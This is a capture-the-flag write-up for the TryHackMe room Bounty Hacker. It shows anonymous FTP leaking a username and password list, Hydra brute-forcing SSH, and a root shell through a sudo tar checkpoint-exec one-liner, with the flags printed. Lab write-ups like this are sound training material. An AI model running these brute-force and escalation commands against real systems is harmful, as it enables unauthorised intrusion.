---
title: "Bounty Hacker: Turning Anonymous FTP Exposure into SSH Access and Root"
date: 2026-04-03 09:00:00 +0300
category: cybersecurity
subcategories:
  - ctf
  - credential-access
  - privilege-escalation
tags:
  - CTF
  - TryHackMe
  - FTP
  - SSH
  - tar
  - Privilege Escalation
type: technical-breakdown
summary: "Anonymous FTP leaks just enough internal material to recover a username, target SSH, and later abuse sudo tar for root."
featured: false
---

Machine: [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)

## Introduction

Bounty Hacker is a small Linux target built around a very practical compromise path. There was no unusual exploit involved in the initial foothold. Instead, the box exposed internal material over anonymous FTP, and that leak was enough to recover a likely username, build a targeted password attack against SSH, and get a shell. After that, local enumeration led to a permissive `sudo` rule on `tar`, which provided the route to root.

What makes the machine worth documenting is how clearly it rewards basic assessment discipline. Nothing here is especially exotic, but the individual exposures line up in a way that makes careful enumeration more important than creativity.

## Initial Enumeration

I started with a full TCP scan to understand the attack surface.

```bash
nmap -sC -sV -p- -T4 -oN nmap_full TARGET_IP
```

The result was short and immediately useful:

```text
21/tcp  open  ftp   vsftpd 3.0.5
22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp  open  http  Apache httpd 2.4.41
```

At that point, SSH was clearly relevant but not actionable without credentials. FTP stood out because anonymous access was enabled, which often turns a routine service into a source of exposed files. I still wanted a quick look at the web server first, mainly to decide whether it was likely to be the entry point or just another place to collect context.

## Quick Web Triage

I checked the web root with a small directory brute-force run.

```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
```

That turned up a very limited surface:

```text
/index.html
/images
/javascript
/server-status (403)
```

The site looked static, so I pulled the homepage directly.

```bash
curl http://TARGET_IP
```

The content exposed a few names:

```text
Spike
Jet
Ed
Faye
```

That was useful, but only as supporting information. I did not see anything suggesting a web foothold, and the site felt more like themed content than an application I needed to attack. With that in mind, FTP became the obvious next stop.

## Anonymous FTP

I connected to the FTP service using anonymous login and listed the available files.

```bash
ftp TARGET_IP
```

Inside the session, I pulled down both files that were present.

```bash
ls
get task.txt
get locks.txt
exit
```

The share contained:

```text
locks.txt
task.txt
```

`task.txt` was the first file I checked.

```bash
cat task.txt
```

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

The actual tasks were not important. The signature was. `lin` looked much more like a real lead than the names from the website, because it appeared in what read like an internal note rather than public-facing content.

The second file made the SSH path much more plausible.

```bash
cat locks.txt
```

```text
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
...
RedDr4gonSynd1cat3
...
ReDSynd1ca7e
```

This was clearly a password list or a set of password variants built around the same theme. At that point, the picture was fairly clear: anonymous FTP had exposed exactly the kind of information that could be reused against SSH.

## Testing the SSH Hypothesis

Before going straight to `lin`, I tested one of the names from the website. That was less about expecting `spike` to work and more about checking whether the names on the page were just theme material or whether they overlapped with real system users.

```bash
hydra -l spike -P locks.txt ssh://TARGET_IP
```

That returned no valid credentials.

```text
0 valid passwords found
```

That result helped narrow the direction. The names on the site did not look like strong SSH candidates anymore, while `lin` still did because it came from the FTP note.

So I retried the same attack using the username from `task.txt`.

```bash
hydra -l lin -P locks.txt ssh://TARGET_IP
```

This time it hit immediately:

```text
[22][ssh] host: TARGET_IP   login: lin   password: RedDr4gonSynd1cat3
```

That gave me valid SSH credentials built entirely from material exposed over FTP.

## User Access

I used the recovered credentials to connect over SSH.

```bash
ssh lin@TARGET_IP
```

Once I landed on the box, I checked the user directory and confirmed access with the user flag.

```bash
ls
cat user.txt
```

```text
THM{CR1M3_SyNd1C4T3}
```

At that stage, the foothold was established. Nothing obvious at user level stood out as the next escalation vector, so the next high-value check was the usual one: `sudo -l`.

## Local Enumeration and Privilege Escalation

Running `sudo -l` exposed the critical local misconfiguration.

```bash
sudo -l
```

```text
User lin may run the following commands on hostname:
    (root) /bin/tar
```

That was the first concrete privilege escalation path on the host. A `sudo` rule on `tar` is dangerous because `tar` can execute commands through its checkpoint functionality. If it can be run as root, it can be used to spawn a root shell.

I switched into `/tmp` and used that behavior directly.

```bash
cd /tmp
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

As soon as the shell dropped, I verified the context:

```bash
whoami
```

```text
root
```

That was enough to complete the escalation. There was no need to dig for anything more complicated once the `sudo` rule was in place.

## Root Access

With a root shell available, the last step was straightforward.

```bash
cd /root
ls
cat root.txt
```

```text
THM{80UN7Y_h4cK3r}
```

## Conclusion

The full path on Bounty Hacker was simple and disciplined: identify exposed services, rule out the web server as the main entry point, use anonymous FTP to recover a likely username and a password list, turn that leak into valid SSH access, and escalate through an unsafe `sudo` permission on `tar`.

What I liked about this room is that it reinforces a point that comes up often in real assessments: compromise does not always begin with a software flaw. Sometimes the decisive issue is exposure. Publicly accessible files, reusable credentials, and careless privilege delegation may look minor when viewed separately, but together they are enough to lose the host.
